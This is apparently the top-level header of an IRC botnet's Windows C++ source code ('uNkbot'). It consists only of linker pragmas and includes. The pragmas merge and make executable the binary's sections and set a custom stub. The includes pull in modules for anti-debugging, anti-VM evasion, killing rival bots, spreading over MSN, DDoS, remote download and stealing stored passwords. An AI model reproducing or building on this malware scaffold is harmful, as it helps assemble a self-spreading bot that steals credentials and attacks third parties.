#pragma optimize("gsy", on)
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/IGNORE:4089")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/SECTION:.text, EWR")
#pragma comment(linker, "/STUB:stub.exe")

#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#define WIN32_EXTRA_LEAN


#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <commctrl.h>
#include <shlwapi.h>
#include <list>
#include <sqlext.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include <winable.h>
#include <sys\types.h>

#include "defines.h"

#include "Psapi.h"
#include "AntiDebug.h"	// Anti debugger.
#include "AntiVM.h"		// Anti VM.
#include "botkiller.h"	// Bot Killer.
#include "loaddlls.h"
#include "uNkbot.h"
#include "utility.h"
#include "irc.h"
#include "commands.h"
#include "protocol.h"
#include "threads.h"
#include "externs.h"
#include "download.h"
#include "msn.h"		// MSN Spreader.
#include "ZipIt.h"
#include "visit.h"
#include "ddos.h"
#include "pstore.h"


#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(lib, "msvcrt")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "wininet")
#pragma comment(lib, "Psapi")